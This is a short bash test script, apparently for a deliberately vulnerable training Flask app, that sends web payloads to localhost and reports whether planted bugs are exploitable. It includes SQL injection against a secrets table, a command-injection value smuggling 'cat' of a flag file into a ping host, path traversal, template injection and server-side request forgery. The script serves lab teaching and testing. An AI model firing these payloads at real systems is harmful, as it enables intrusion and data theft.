#!/usr/bin/env bash
# Fires every payload from GUIDE.md at the app.
#   PASS on flows 1-5 = the exploit worked (the planted bug is live)
#   PASS on the decoy = the payload was blocked (the int() sanitizer held)
# After you fix a sink yourself, the matching flow should flip to FAIL. That's the point.
# Usage: ./check.sh              (app on :5000)
#        FLASK=http://localhost:5000 ./check.sh
FLASK="${FLASK:-http://localhost:5000}"
fail=0

hit() { curl -s --max-time 8 "$1"; }
expect_hit() { if hit "$2" | grep -q -- "$3"; then printf "  PASS  %-20s exploit works\n" "$1"; else printf "  FAIL  %-20s exploit did not work\n" "$1"; fail=1; fi; }
expect_blocked() { if hit "$2" | grep -q -- "$3"; then printf "  FAIL  %-20s payload got through\n" "$1"; fail=1; else printf "  PASS  %-20s blocked\n" "$1"; fi; }

payloads() { # $1 base, $2 checker
  local B="$1" C="$2"
  $C "1 sqli      /user"  "$B/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets" "FLAG{sqli"
  $C "2 cmdi      /ping"  "$B/ping?host=127.0.0.1%3Bcat%20/app/secret/flag.txt" "FLAG{you_reached"
  $C "3 traversal /docs"  "$B/docs?name=..%2F..%2Fsecret%2Fflag.txt" "FLAG{you_reached"
  $C "4 ssti      /hello" "$B/hello?name=%7B%7B7*7%7D%7D" "Hello 49"
  $C "5 ssrf      /fetch" "$B/fetch?url=http://127.0.0.1:5000/user?id=2" "bob@example.com"
}

run_side() { # $1 label, $2 base, $3 checker
  echo "== $1  $2"
  curl -s --max-time 5 -o /dev/null "$2/" || { echo "  not reachable"; fail=1; return; }
  payloads "$2" "$3"
  expect_blocked "decoy      /order" "$2/order?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets" "FLAG{"
}

run_side "grep-trace-pwn" "$FLASK" expect_hit

echo
[ $fail -eq 0 ] && echo "ALL PASS" || { echo "SOMETHING FAILED (see above)"; exit 1; }
